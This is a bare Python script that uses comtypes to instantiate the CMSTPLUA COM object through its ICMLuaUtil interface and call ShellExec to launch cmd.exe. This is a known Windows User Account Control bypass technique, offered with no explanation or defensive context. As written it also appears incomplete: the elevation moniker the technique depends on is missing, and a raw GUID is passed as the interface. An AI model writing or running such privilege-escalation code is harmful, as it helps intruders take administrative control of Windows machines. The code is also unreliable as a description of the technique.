from comtypes import GUID
from comtypes.client import CreateObject

CLSID_CMLUA = GUID("{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
IID_ICMLuaUtil = GUID("{6EDD6D74-C007-4E75-B76A-E5740995E24C}")

icm = CreateObject(CLSID_CMLUA, interface=IID_ICMLuaUtil)
icm.ShellExec("C:\\Windows\\System32\\cmd.exe", None, None, 0, 1)
